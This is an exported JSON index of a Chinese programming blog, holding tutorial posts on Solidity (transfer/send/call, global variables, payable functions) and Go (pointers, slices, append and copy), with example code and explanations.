_address.call.value(10 ether)();&#125; 对比总结 123456transfer与send相似，都为转账操作transfer出错抛出异常send、call出错不抛出异常，返回true或falsetansfer相对send更安全send、call即便转账失败也会执行其后的代码慎用call函数转账，容易发生重入攻击。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[24]-global","slug":"solidity-24-global","date":"2018-11-20T15:11:20.000Z","updated":"2018-11-20T16:36:42.657Z","comments":true,"path":"2018/11/20/solidity-24-global/","link":"","permalink":"https://dreamerjonson.com/2018/11/20/solidity-24-global/","excerpt":"","text":"solidity中的全局属性 block.blockhash(uint blockNumber) returns (bytes32)：返回给定区块号的哈 希值，只支持最近256个区块，且不包含当前区块。在版本0.4.22中弃用并被替换为。blockhash(uint blockNumber) block.coinbase (address): 当前块矿工的地址。 block.difficulty (uint):当前块的难度。 block.gaslimit (uint):当前块的gaslimit。 block.number (uint):当前区块的块号。 block.timestamp (uint): 当前块的Unix时间戳（从1970/1/1 00:00:00 UTC开始所经过的秒数） msg.data (bytes): 完整的调用数据（calldata）。 msg.sender (address): 当前调用发起人的地址。 msg.sig (bytes4):调用数据(calldata)的前四个字节（例如为：函数标识符）。 msg.value (uint): 这个消息所附带的以太币，单位为wei。 now (uint): 当前块的时间戳(block.timestamp的别名) tx.gasprice (uint) : 交易的gas价格。 tx.origin (address): 交易的发送者（全调用链） 案例 1234567891011121314151617181920212223242526272829303132333435363738pragma solidity ^0.4.23;contract global&#123; function getGlobal1() public view returns(address)&#123; return msg.sender ; &#125; function getGlobal2() public view returns(uint)&#123; return block.difficulty; &#125; function getGlobal3() public view returns(uint)&#123; return block.number; &#125; function getGlobal4() public view returns(address)&#123; return block.coinbase; &#125; function getGlobal5() public pure returns(bytes)&#123; return msg.data; &#125; function getGlobal6() public payable returns(uint )&#123; return msg.value ; &#125; function getGlobal7() public view returns(address )&#123; return tx.origin; &#125; function getGlobal8() public view returns(uint )&#123; return now; &#125; function getGlobal9() public view returns(bytes32 )&#123; return blockhash(block.number-1); &#125;&#125; 参考资料： https://solidity.readthedocs.io/en/develop/units-and-global-variables.html","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[23]-payable","slug":"solidity-23-payable","date":"2018-11-20T15:01:15.000Z","updated":"2018-11-20T15:13:43.941Z","comments":true,"path":"2018/11/20/solidity-23-payable/","link":"","permalink":"https://dreamerjonson.com/2018/11/20/solidity-23-payable/","excerpt":"","text":"转账 如果在函数中涉及到以太币的转移，需要使用到payable关键词。意味着可以在调用这笔函数的消息中附带以太币。 123function pay() public payable&#123; &#125; this代表合约地址 this 代表当前部署的合约地址 12345function getThis() public view returns(address)&#123; return this; // 0x9F4c14f487B8e4E3986467c2a2aA5bDE93052666 //0x9f4c14f487b8e4e3986467c2a2aa5bde93052666 &#125; 获取合约账户余额 1234function getbalance() public view returns(uint)&#123; return address(this).balance; &#125; 获取外部账户余额 123function getExternalBalance(address account) public view returns(uint)&#123; return account.balance; &#125; 转账 12345678910//给外部账户转账function transfer() public payable&#123; address account = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c; account.transfer(msg.value); &#125;//给合约地址转账 function transfer2() public payable&#123; address(this).transfer(msg.value);&#125; 给合约地址与外部地址同时转账 在下面的例子中，如果在调用此函数时，附带了20Ether，那么就会给account账户转移10ether，给合约账户转移10ether 1234function transfer3() public payable&#123; address account = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c; account.transfer(10*10**18);&#125; 全部代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445pragma solidity ^0.4.23;contract payableTest&#123; function pay() public payable&#123; &#125; function getbalance() public view returns(uint)&#123; return address(this).balance; &#125; function getThis() public view returns(address)&#123; return this; // 0x9F4c14f487B8e4E3986467c2a2aA5bDE93052666 //0x9f4c14f487b8e4e3986467c2a2aa5bde93052666 &#125; function getExternalBalance(address account) public view returns(uint)&#123; return account.balance; &#125; function transfer() public payable&#123; address account = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c; account.transfer(msg.value); &#125; function transfer2() public payable&#123; address(this).transfer(msg.value); &#125; function () public payable&#123; &#125; function transfer3() public payable&#123; address account = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c; account.transfer(10*10**18); &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"go语言渐入佳境[14]-指针","slug":"golang-14-pointer","date":"2018-11-20T10:26:24.000Z","updated":"2019-01-21T06:21:09.655Z","comments":true,"path":"2018/11/20/golang-14-pointer/","link":"","permalink":"https://dreamerjonson.com/2018/11/20/golang-14-pointer/","excerpt":"","text":"变量的地址 12a :=10fmt.Printf(&quot;a变量的地址为：%#X\\n&quot;,&amp;a)//a变量的地址为：0XC420092008 指针的声明 12//声明var p *int 空指针 123if p==nil&#123; fmt.Println(&quot;p为空指针&quot;)&#125; 通过指针获取值 12p = &amp;afmt.Printf(&quot;p的类型为%T, p的值为：%v,p指向的int的值为：%v,a的值为：%d\\n&quot;,p,p,*p,a) 通过指针修改值 12*p = 99fmt.Printf(&quot;p的类型为%T, p的值为：%v,p指向的int的值为：%v,a的值为：%d\\n&quot;,p,p,*p,a) 完整例子1 123456789101112131415161718192021222324252627282930package mainimport \"fmt\"func main()&#123; //变量的地址 a :=10 fmt.Printf(\"a变量的地址为：%#X\\n\",&amp;a) //声明 var p *int //空指针 if p==nil&#123; fmt.Println(\"p为空指针\") &#125; //通过指针获取值 p = &amp;a fmt.Printf(\"p的类型为%T, p的值为：%v,p指向的int的值为：%v,a的值为：%d\\n\",p,p,*p,a) //通过指针修改值 *p = 99 fmt.Printf(\"p的类型为%T, p的值为：%v,p指向的int的值为：%v,a的值为：%d\\n\",p,p,*p,a)&#125; 指针作为函数参数 指针作为函数参数,修改原来的值： 1234567891011121314151617181920212223242526package mainimport \"fmt\"func main() &#123; a := 10 fmt.Printf(\"1、变量a的内存地址是：%p ，值为：%v \\n\\n\", &amp;a, a)//10 b := &amp;a change(b) fmt.Printf(\"3、change函数调用之后，变量a的内存地址是：%p ，值为：%v \\n\\n\", &amp;a, a)//20 change0(a) fmt.Printf(\"5、change0函数调用之后，变量a的内存地址是：%p ，值为：%v \\n\\n\", &amp;a, a)//20&#125;func change(a *int) &#123; fmt.Printf(\"2、change函数内，变量a的内存地址是：%p ，值为：%v \\n\\n\", &amp;a, a)//20 *a = 50&#125;func change0(a int) &#123; fmt.Printf(\"4、change0函数内，变量a的内存地址是：%p ，值为：%v \\n\\n\", &amp;a, a)//20 a = 90&#125; 切片类型指针作为函数参数 123456789101112131415161718192021222324package mainimport \"fmt\"func main() &#123; a := []int&#123;1, 2, 3, 4&#125; fmt.Printf(\"1、变量a的内存地址是：%p ，值为：%v \\n\\n\", &amp;a, a) modify(&amp;a) fmt.Printf(\"3、调用modify函数后，变量a的内存地址是：%p ，值为：%v \\n\\n\", &amp;a, a) modify0(a) fmt.Printf(\"5、调用modify0函数后，变量a的内存地址是：%p ，值为：%v \\n\", &amp;a, a)&#125;func modify(arr *[]int) &#123; fmt.Printf(\"2、modify函数中参数a的内存地址是：%p ，值为：%v \\n\", &amp;arr, arr) (*arr)[0] = 250&#125;func modify0(arr []int) &#123; fmt.Printf(\"4、modify0函数中参数a的内存地址是：%p ，值为：%v \\n\", &amp;arr, arr) arr[0] = 99&#125; 指针作为函数参数例子2 1234567891011121314151617181920212223242526package mainimport \"fmt\"func main() &#123; //定义两个局部变量 a, b := 100, 200 // 返回值的写法实现数据交换 a, b = swap0(a, b) fmt.Println(\"第一次交换后：\" , a, b) // 使用指针实现交换 swap(&amp;a, &amp;b) fmt.Println(\"第二次交换后：\" , a, b)&#125;//具有返回值的惯用写法，实现两个数据的交换func swap0(x, y int) (int, int) &#123; return y, x&#125;//使用指针作为参数的写法func swap(x, y *int) &#123; *x, *y = *y, *x&#125; 指针数组 数组，数组中的元素存储的都是指针。 1234567891011121314151617181920212223242526272829303132package mainimport \"fmt\"const COUNT int = 4func main() &#123; a := [COUNT]string&#123;\"abc\", \"ABC\", \"123\", \"一二三\"&#125; //查看数组的指针的类型和值 fmt.Printf(\"%T , %v \\n\", &amp;a, &amp;a) //定义指针数组 var ptr [COUNT]*string fmt.Printf(\"%T , %v \\n\", ptr, ptr) for i := 0; i &lt; COUNT; i++ &#123; // 将数组中每个元素的地址赋值给指针数组的每个元素 ptr[i] = &amp;a[i] &#125; fmt.Printf(\"%T , %v \\n\", ptr, ptr) fmt.Println(ptr[0]) // 根据指针数组元素的每个地址获取该地址所指向的元素的真实数值 for i:=0; i&lt;COUNT ;i++ &#123; fmt.Println(*ptr[i]) &#125; for _,value :=range ptr &#123; fmt.Println(*value) &#125;&#125; 多级指针 1234567891011121314151617181920212223package mainimport \"fmt\"func main() &#123; var a int var ptr *int var pptr **int a = 123 // 为指针赋值 ptr = &amp;a fmt.Println(\"ptr:\" , ptr) //为pptr赋值 pptr = &amp;ptr fmt.Println(\"pptr\" , pptr) //获取指针对应的值 fmt.Printf(\"变量 a = %d \\n\" , a) fmt.Printf(\"指针变量 *ptr = %d \\n\" , *ptr) fmt.Printf(\"指向到指针的变量 **pptr = %d \\n\" ,**pptr)&#125; 那么垃Go语言的自动圾收集器是如何知道一个变量是何时可以被回收的呢？这里我们可以避开完整的技术细节，基本的实现思路是，从每个包级的变量和每个当前运行函数的每一个局部变量开始，通过指针或引用的访问路径遍历，是否可以找到该变量。如果不存在这样的访问路径，那么说明该变量是不可达的，也就是说它是否存在并不会影响程序后续的计算结果。 因为一个变量的有效周期只取决于是否可达，因此一个循环迭代内部的局部变量的生命周期可能超出其局部作用域。同时，局部变量可能在函数返回之后依然存在。 编译器会自动选择在栈上还是在堆上分配局部变量的存储空间，但可能令人惊讶的是，这个选择并不是由用var还是new声明变量的方式决定的。 1234567var global *intfunc f() &#123; func g() &#123; var x int y := new(int) x = 1 *y = 1 global = &amp;x &#125;&#125; 这里的x变量必须在堆上分配，因为它在函数退出后依然可以通过包一级的global变量找到，虽然它是在函数内部定义的；用Go语言的术语说，这个x局部变量从函数f中逃逸了。相反，当g函数返回时，变量*y将是不可达的，也就是说可以马上被回收的。因此，*y并没有从函数g中逃逸，编译器可以选择在栈上分配*y的存储空间（译注：也可以选择在堆上分配，然后由Go语言的GC回收这个变量的内存空间），虽然这里用的是new方式。其实在任何时候，你并不需为了编写正确的代码而要考虑变量的逃逸行为，要记住的是，逃逸的变量需要额外分配内存，同时对性能的优化可能会产生细微的影响。 Go语言的自动垃圾收集器对编写正确的代码是一个巨大的帮助，但也并不是说你完全不用考虑内存了。你虽然不需要显式地分配和释放内存，但是要编写高效的程序你依然需要了解变量的生命周期。例如，如果将指向短生命周期对象的指针保存到具有长生命周期的对象中，特别是保存到全局变量时，会阻止对短生命周期对象的垃圾回收（从而可能影响程序的性能）。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[13]-切片","slug":"golang-13-slice","date":"2018-11-20T01:32:36.000Z","updated":"2019-02-15T15:03:28.102Z","comments":true,"path":"2018/11/20/golang-13-slice/","link":"","permalink":"https://dreamerjonson.com/2018/11/20/golang-13-slice/","excerpt":"","text":"切片 Slice（切片）代表变长的序列，序列中每个元素都有相同的类型。一个slice类型一般写作[]T，其中T代表slice中元素的类型；slice的语法和数组很像，只是没有固定长度而已。 数组和slice之间有着紧密的联系。一个slice是一个轻量级的数据结构，提供了访问数组子序列（或者全部）元素的功能，而且slice的底层确实引用一个数组对象。一个slice由三个部分构成：指针、长度和容量。指针指向第一个slice元素对应的底层数组元素的地址，要注意的是slice的第一个元素并不一定就是数组的第一个元素。长度对应slice中元素的数目；长度不能超过容量，容量一般是从slice的开始位置到底层数据的结尾位置。内置的len和cap函数分别返回slice的长度和容量。 多个slice之间可以共享底层的数据，并且引用的数组部分区间可能重叠。图4.1显示了表示一年中每个月份名字的字符串数组，还有重叠引用了该数组的两个slice。数组这样定义 1months := [...]string&#123;1: &quot;January&quot;, /* ... */, 12: &quot;December&quot;&#125; 因此一月份是months[1]，十二月份是months[12]。通常，数组的第一个元素从索引0开始，但是月份一般是从1开始的，因此我们声明数组时直接第0个元素，第0个元素会被自动初始化为空字符串。 slice的切片操作s[i:j]，其中0 ≤ i≤ j≤ cap(s)，用于创建一个新的slice，引用s的从第i个元素开始到第j-1个元素的子序列。新的slice将只有ji个元素。如果i位置的索引被省略的话将使用0代替，如果j位置的索引被省略的话将使用len(s)代替。因此，months[1:13]切片操作将引用全部有效的月份，和months[1:]操作等价；months[:]切片操作则是引用整个数组。让我们分别定义表示第二季度和北方夏天月份的slice，它们有重叠部分： 1、切片可以修改大小 2、切片的拷贝不是单纯值的拷贝，一个切片指向了一个数组 slice 123456789101112Q2 := months[4:7]summer := months[6:9]fmt.Println(Q2) // [&quot;April&quot; &quot;May&quot; &quot;June&quot;]fmt.Println(summer) // [&quot;June&quot; &quot;July&quot; &quot;August&quot;]两个slice都包含了六月份，下面的代码是一个包含相同月份的测试（性能较低）：for _, s := range summer &#123; for _, q := range Q2 &#123; if s == q &#123; fmt.Printf(&quot;%s appears in both\\n&quot;, s) &#125; &#125;&#125; 如果切片操作超出cap(s)的上限将导致一个panic异常，但是超出len(s)则是意味着扩展了slice，因为新slice的长度会变大： fmt.Println(summer[:20]) // panic: out of range endlessSummer := summer[:5] // extend a slice (within capacity) fmt.Println(endlessSummer) // “[June July August September October]” 另外，字符串的切片操作和[]byte字节类型切片的切片操作是类似的。它们都写作x[m:n]，并且都是返回一个原始字节系列的子序列，底层都是共享之前的底层数组，因此切片操作对应常量时间复杂度。x[m:n]切片操作对于字符串则生成一个新字符串，如果x是[]byte的话则生成一个新的[]byte。 因为slice值包含指向第一个slice元素的指针，因此向函数传递slice将允许在函数内部修改底层数组的元素。换句话说，复制一个slice只是对底层的数组创建了一个新的slice别名（§2.3.2）。下面的reverse函数在原内存空间将[]int类型的slice反转，而且它可以用于任意长度的slice。 1234567// reverse reverses a slice of ints in place.func reverse(s []int) &#123; for i, j := 0, len(s)-1; i &lt; j; i, j = i+1, j-1 &#123; s[i], s[j] = s[j], s[i] &#125;&#125; 这里我们反转数组的应用： a := […]int{0, 1, 2, 3, 4, 5} reverse(a[:]) fmt.Println(a) // “[5 4 3 2 1 0]” 一种将slice元素循环向左旋转n个元素的方法是三次调用reverse反转函数，第一次是反转开头的n个元素，然后是反转剩下的元素，最后是反转整个slice的元素。（如果是向右循环旋转，则将第三个函数调用移到第一个调用位置就可以了。） s := []int{0, 1, 2, 3, 4, 5} // Rotate s left by two positions. reverse(s[:2]) reverse(s[2:]) reverse(s) fmt.Println(s) // “[2 3 4 5 0 1]” 要注意的是slice类型的变量s和数组类型的变量a的初始化语法的差异。slice和数组的字面值语法很类似，它们都是用花括弧包含一系列的初始化元素，但是对于slice并没有指明序列的长度。这会隐式地创建一个合适大小的数组，然后slice的指针指向底层的数组。就像数组字面值一样，slice的字面值也可以按顺序指定初始化值序列，或者是通过索引和元素值指定，或者的两种风格的混合语法初始化。 和数组不同的是，slice之间不能比较，因此我们不能使用==操作符来判断两个slice是否含有全部相等元素。不过标准库提供了高度优化的bytes.Equal函数来判断两个字节型slice是否相等（[]byte），但是对于其他类型的slice，我们必须自己展开每个元素进行比较： 1234567891011func equal(x, y []string) bool &#123; if len(x) != len(y) &#123; return false &#125; for i := range x &#123; if x[i] != y[i] &#123; return false &#125; &#125; return true&#125; 上面关于两个slice的深度相等测试，运行的时间并不比支持==操作的数组或字符串更多，但是为何slice不直接支持比较运算符呢？这方面有两个原因。第一个原因，一个slice的元素是间接引用的，一个slice甚至可以包含自身。虽然有很多办法处理这种情形，但是没有一个是简单有效的。 第二个原因，因为slice的元素是间接引用的，一个固定值的slice在不同的时间可能包含不同的元素，因为底层数组的元素可能会被修改。并且Go语言中map等哈希表之类的数据结构的key只做简单的浅拷贝，它要求在整个声明周期中相等的key必须对相同的元素。对于像指针或chan之类的引用类型，相等测试可以判断两个是否是引用相同的对象。一个针对slice的浅相等测试的操作符可能是有一定用处的，也能临时解决map类型的key问题，但是slice和数组不同的相等测试行为会让人困惑。因此，安全的做饭是直接禁止slice之间的比较操作。 slice唯一合法的比较操作是和nil比较，例如： 123456if summer == nil &#123; /* ... */ &#125;一个零值的slice等于nil。一个nil值的slice并没有底层数组。一个nil值的slice的长度和容量都是0，但是也有非nil值的slice的长度和容量也是0的，例如[]int&#123;&#125;或make([]int, 3)[3:]。与任意类型的nil值一样，我们可以用[]int(nil)类型转换表达式来生成一个对应类型slice的nil值。var s []int // len(s) == 0, s == nils = nil // len(s) == 0, s == nils = []int(nil) // len(s) == 0, s == nils = []int&#123;&#125; // len(s) == 0, s != nil 如果你需要测试一个slice是否是空的，使用len(s) == 0来判断，而不应该用s == nil来判断。除了和nil相等比较外，一个nil值的slice的行为和其它任意0产长度的slice一样；例如reverse(nil)也是安全的。除了文档已经明确说明的地方，所有的Go语言函数应该以相同的方式对待nil值的slice和0长度的slice。 内置的make函数创建一个指定元素类型、长度和容量的slice。容量部分可以省略，在这种情况下，容量将等于长度。 make([]T, len) make([]T, len, cap) // same as make([]T, cap)[:len] 在底层，make创建了一个匿名的数组变量，然后返回一个slice；只有通过返回的slice才能引用底层匿名的数组变量。在第一种语句中，slice是整个数组的view。在第二个语句中，slice只引用了底层数组的前len个元素，但是容量将包含整个的数组。额外的元素是留给未来的增长用的。 切片的声明 1234567//切片的声明1 //nilvar slice1 []int //切片的声明2var slice2 []int = make([]int,5)var slice3 []int = make([]int,5,7)numbers:= []int&#123;1,2,3,4,5,6,7,8&#125; 切片截取 12345678numbers:= []int&#123;1,2,3,4,5,6,7,8&#125;//从下标1一直到下标4，但是不包括下标4numbers1 :=numbers[1:4]//从下标0一直到下标3，但是不包括下标3numbers2 :=numbers[:3]//从下标3一直到结束numbers3 :=numbers[3:] 切片截取例子 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package mainimport \"fmt\"//1、切片可以修改大小//2、切片的拷贝不是单纯值的拷贝，一个切片指向了一个数组//切片的声明1var slice1 []int//切片的声明2var slice2 []int = make([]int,5)var slice3 []int = make([]int,5,7)func main()&#123; slice4 := make([]int,5) slice5 := make([]int,5,7) slice6 := make([]int,0) fmt.Printf(\"len=%d,cap=%d,slice=%v\\n\",len(slice4),cap(slice4),slice4) fmt.Printf(\"len=%d,cap=%d,slice=%v\",len(slice5),cap(slice5),slice5) if slice4 ==nil&#123; fmt.Printf(\"len=%d,cap=%d,slice=%v\\n\",len(slice4),cap(slice4),slice4) &#125; // slice6 := make([]int,0)不为nil if slice6 !=nil&#123; fmt.Printf(\"len=%d,cap=%d,slice=%v\\n\",len(slice6),cap(slice6),slice6) &#125; //var slice1 []int为nil if slice1 ==nil&#123; fmt.Printf(\"len=%d,cap=%d,slice=%v\\n\",len(slice1),cap(slice1),slice1) &#125; sliceTest()&#125;//截取func sliceTest()&#123; numbers:= []int&#123;1,2,3,4,5,6,7,8&#125; printSliceInfo(numbers) numbers1 :=numbers[1:4] printSliceInfo(numbers1) numbers2 :=numbers[:3] printSliceInfo(numbers2) numbers3 :=numbers[3:] printSliceInfo(numbers3)&#125;//打印切片func printSliceInfo(x []int)&#123; fmt.Printf(\"len=%d,cap=%d,slice=%v\\n\",len(x),cap(x),x)&#125; 利用切片截取进行删除 1234567891011// 切片删除// 删除第一个元素numbers = numbers[1:] // 删除最后一个numbers = numbers[:len(numbers)-1]//删除中间一个元素a := int(len(numbers) / 2)numbers = append(numbers[:a], numbers[a+1:]...) 切片与数组的拷贝对比 数组的拷贝是副本拷贝。对于副本的改变不会影响到 切片的拷贝很特殊，切片的副本仍然指向了相同的数组。所以，对于副本的修改会影响到相同的数组。 下面的例子说明 12345678910111213141516171819202122package mainimport \"fmt\"func main() &#123; //数组是值类型 a := [4]int&#123;1, 2, 3, 4&#125; //切片是引用类型 b := []int&#123;100, 200, 300&#125; c := a d := b c[1] = 200 d[0] = 1 fmt.Println(\"a=\", a, \"c=\", c) //c[1 200 3 4] a[1 2 3 4] fmt.Println(\"b=\", b, \"d=\", d) //d[1 200 300] b[1 200 300]&#125; append添加元素 12345678910111213numbers := make([]int, 0, 20)//append一个元素numbers = append(numbers, 0)//append多个元素numbers = append(numbers, 1, 2, 3, 4, 5, 6, 7)//append添加切片s1 := []int&#123;100, 200, 300, 400, 500, 600, 700&#125;numbers = append(numbers, s1...) //[0 1 2 3 4 5 6 7 100 200 300 400 500 600 700] copy 毫无疑问，创建新的目标切片就会有新的指向的数组。数组的copy是对于不同的数组的值的拷贝 12345//创建目标切片numbers1 := make([]int, len(numbers), cap(numbers)*2)// 将numbers的元素拷贝到numbers1中count := copy(numbers1, numbers) slice 转array 12345678910111213You need to use copy:slice := []byte(&quot;abcdefgh&quot;)var arr [4]bytecopy(arr[:], slice[:4])fmt.Println(arr)As Aedolon notes you can also just usecopy(arr[:], slice)as copy will always only copy the minimum of len(src) and len(dst) bytes. 例子2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768package mainimport \"fmt\"func main() &#123; fmt.Println(\"1、--------------\") //var numbers []int numbers := make([]int, 0, 20) //append一个元素 numbers = append(numbers, 0) printSlice(\"numbers:\", numbers) //[0] //append多个元素 numbers = append(numbers, 1, 2, 3, 4, 5, 6, 7) printSlice(\"numbers:\", numbers) //[0 1 2 3 4 5 6 7] //append添加切片 s1 := []int&#123;100, 200, 300, 400, 500, 600, 700&#125; numbers = append(numbers, s1...) //[0 1 2 3 4 5 6 7 100 200 300 400 500 600 700] printSlice(\"numbers:\", numbers) fmt.Println(\"2、--------------\") // 切片删除 // 删除第一个元素 numbers = numbers[1:] printSlice(\"numbers:\", numbers) //[ 1 2 3 4 5 6 7 100 200 300 400 500 600 700] // 删除最后一个 numbers = numbers[:len(numbers)-1] printSlice(\"numbers:\", numbers) //[ 1 2 3 4 5 6 7 100 200 300 400 500 600] //删除中间一个元素 a := int(len(numbers) / 2) fmt.Println(\"中间下标：\", a) numbers = append(numbers[:a], numbers[a+1:]...) printSlice(\"numbers:\", numbers) //[1 2 3 4 5 6 100 200 300 400 500 600] fmt.Println(\"3、--------------\") //创建目标切片 numbers1 := make([]int, len(numbers), cap(numbers)*2) // 将numbers的元素拷贝到numbers1中 count := copy(numbers1, numbers) fmt.Println(\"拷贝的个数：\", count) printSlice(\"numbers1:\", numbers1) //拷贝的两个切片是否有关联 numbers[0] = 99 numbers1[len(numbers1)-1] = 100 printSlice(\"numbers\", numbers) printSlice(\"numbers1\", numbers1)&#125;func printSlice(name string, x []int) &#123; fmt.Print(name, \"\\t\") fmt.Printf(\"地址：%p \\t len=%d \\t cap=%d \\t value=%v \\n\", x, len(x), cap(x), x)&#125; 疯狂切片原理 理解了下面代码到底输出什么，就理解了切片的原理。 12345678910111213141516package mainimport \"fmt\"func f(s []string, level int) &#123; if level &gt; 5 &#123; return &#125; s = append(s, fmt.Sprint(level)) f(s, level+1) fmt.Println(\"level:\", level, \"slice:\", s)&#125;func main() &#123; f(nil, 0)&#125; 输出结果： 123456level: 5 slice: [0 1 2 3 4 5]level: 4 slice: [0 1 2 3 4]level: 3 slice: [0 1 2 3]level: 2 slice: [0 1 2]level: 1 slice: [0 1]level: 0 slice: [0] 参考资料： https://dave.cheney.net/2018/07/12/slices-from-the-ground-up append函数深入 内置的append函数用于向slice追加元素： 12345var runes []runefor _, r := range \"Hello, 世界\" &#123; runes = append(runes, r)&#125;fmt.Printf(\"%q\\n\", runes) // \"['H' 'e' 'l' 'l' 'o' ',' ' ' '世' '界']\" 在循环中使用append函数构建一个由九个rune字符构成的slice，当然对应这个特殊的问题我们可以通过Go语言内置的[]rune(“Hello, 世界”)转换操作完成。 append函数对于理解slice底层是如何工作的非常重要，所以让我们仔细查看究竟是发生了什么。下面是第一个版本的appendInt函数，专门用于处理[]int类型的slice： 1234567891011121314151617181920func appendInt(x []int, y int) []int &#123; var z []int zlen := len(x) + 1 if zlen &lt;= cap(x) &#123; // There is room to grow. Extend the slice. z = x[:zlen] &#125; else &#123; // There is insufficient space. Allocate a new array. // Grow by doubling, for amortized linear complexity. zcap := zlen if zcap &lt; 2*len(x) &#123; zcap = 2 * len(x) &#125; z = make([]int, zlen, zcap) copy(z, x) // a built-in function; see text &#125; z[len(x)] = y return z&#125; 每次调用appendInt函数，必须先检测slice底层数组是否有足够的容量来保存新添加的元素。如果有足够空间的话，直接扩展slice（依然在原有的底层数组之上），将新添加的y元素复制到新扩展的空间，并返回slice。因此，输入的x和输出的z共享相同的底层数组。 如果没有足够的增长空间的话，appendInt函数则会先分配一个足够大的slice用于保存新的结果，先将输入的x复制到新的空间，然后添加y元素。结果z和输入的x引用的将是不同的底层数组。 虽然通过循环复制元素更直接，不过内置的copy函数可以方便地将一个slice复制另一个相同类型的slice。copy函数的第一个参数是要复制的目标slice，第二个参数是源slice，目标和源的位置顺序和dst = src赋值语句是一致的。两个slice可以共享同一个底层数组，甚至有重叠也没有问题。copy函数将返回成功复制的元素的个数（我们这里没有用到），等于两个slice中较小的长度，所以我们不用担心覆盖会超出目标slice的范围。 为了提高内存使用效率，新分配的数组一般略大于保存x和y所需要的最低大小。通过在每次扩展数组时直接将长度翻倍从而避免了多次内存分配，也确保了添加单个元素操的平均时间是一个常数时间。这个程序演示了效果： 12345678func main() &#123; var x, y []int for i := 0; i &lt; 10; i++ &#123; y = appendInt(x, i) fmt.Printf(&quot;%d cap=%d\\t%v\\n&quot;, i, cap(y), y) x = y &#125;&#125; 每一次容量的变化都会导致重新分配内存和copy操作： 123456789100 cap=1 [0]1 cap=2 [0 1]2 cap=4 [0 1 2]3 cap=4 [0 1 2 3]4 cap=8 [0 1 2 3 4]5 cap=8 [0 1 2 3 4 5]6 cap=8 [0 1 2 3 4 5 6]7 cap=8 [0 1 2 3 4 5 6 7]8 cap=16 [0 1 2 3 4 5 6 7 8]9 cap=16 [0 1 2 3 4 5 6 7 8 9] 内置的append函数可能使用比a​​ppendInt更复杂的内存扩展策略。因此，通常我们并不知道append调用是否导致了内存的重新分配，因此我们也不能确认新的slice和原始的slice是否引用的是相同的底层数组空间。同样，我们不能确认在原先的slice上的操作是否会影响到新的slice。因此，通常是将append返回的结果直接赋值给输入的slice变量： runes = append(runes, r) 更新slice变量不仅对调用append函数是必要的，实际上对应任何可能导致长度、容量或底层数组变化的操作都是必要的。要正确地使用slice，需要记住尽管底层数组的元素是间接访问的，但是slice对应结构体本身的指针、长度和容量部分是直接访问的。要更新这些信息需要像上面例子那样一个显式的赋值操作。从这个角度看，slice并不是一个纯粹的引用类型，它实际上是一个类似下面结构体的聚合类型： 1234type IntSlice struct &#123; ptr *int len, cap int&#125; 我们的appendInt函数每次只能向slice追加一个元素，但是内置的append函数则可以追加多个元素，甚至追加一个slice。 123456var x []intx = append(x, 1)x = append(x, 2, 3)x = append(x, 4, 5, 6)x = append(x, x...) // append the slice xfmt.Println(x) // &quot;[1 2 3 4 5 6 1 2 3 4 5 6]&quot; 通过下面的小修改，我们可以可以达到append函数类似的功能。其中在appendInt函数参数中的最后的“…”省略号表示接收变长的参数为slice。我们将在5.7节详细解释这个特性。 1234567func appendInt(x []int, y ...int) []int &#123; var z []int zlen := len(x) + len(y) // ...expand z to at least zlen... copy(z[len(x):], y) return z&#125; 为了避免重复，和前面相同的代码并没有显示。 Slice内存技巧 让我们看看更多的例子，比如旋转slice、反转slice或在slice原有内存空间修改元素。给定一个字符串列表，下面的nonempty函数将在原有slice内存空间之上返回不包含空字符串的列表： 123456789101112131415161718// Nonempty is an example of an in-place slice algorithm.package mainimport &quot;fmt&quot;// nonempty returns a slice holding only the non-empty strings.// The underlying array is modified during the call.func nonempty(strings []string) []string &#123; i := 0 for _, s := range strings &#123; if s != &quot;&quot; &#123; strings[i] = s i++ &#125; &#125; return strings[:i]&#125; 比较微妙的地方是，输入的slice和输出的slice共享一个底层数组。这可以避免分配另一个数组，不过原来的数据将可能会被覆盖，正如下面两个打印语句看到的那样： data := []string{“one”, “”, “three”} fmt.Printf(&quot;%q\\n&quot;, nonempty(data)) // [&quot;one&quot; &quot;three&quot;] fmt.Printf(&quot;%q\\n&quot;, data) // [&quot;one&quot; &quot;three&quot; &quot;three&quot;] 因此我们通常会这样使用nonempty函数：data = nonempty(data)。 nonempty函数也可以使用append函数实现： 123456789func nonempty2(strings []string) []string &#123; out := strings[:0] // zero-length slice of original for _, s := range strings &#123; if s != &quot;&quot; &#123; out = append(out, s) &#125; &#125; return out&#125; 